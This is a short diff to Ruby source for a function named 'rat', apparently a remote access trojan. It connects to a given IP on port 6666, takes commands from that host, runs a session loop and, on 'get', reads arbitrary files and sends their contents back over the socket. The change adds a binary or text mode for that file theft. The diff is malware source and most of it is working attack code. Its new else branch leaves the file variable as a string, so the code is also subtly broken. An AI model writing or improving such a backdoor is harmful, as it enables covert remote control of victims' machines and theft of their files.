@@ -5,7 +5,7 @@ def rat(ip)
   begin
     socket = TCPSocket.new(ip, 6666)
     loop do
-      command, file = socket.gets.chomp.split(' ')
+      command, file, format = socket.gets.chomp.split(' ')
       case command
       when 'session'
         loop do
@@ -21,7 +21,14 @@ def rat(ip)
           socket.puts 'done'
         end
       when 'get'
-        file = File.open(file, 'r')
+        if format == 'binary'
+          file = File.open(file, 'rb')
+        elsif format == 'text'
+          file = File.open(file, 'r')
+        else
+          puts 'done'
+        end
+
         content = file.read
         puts content
         socket.puts content
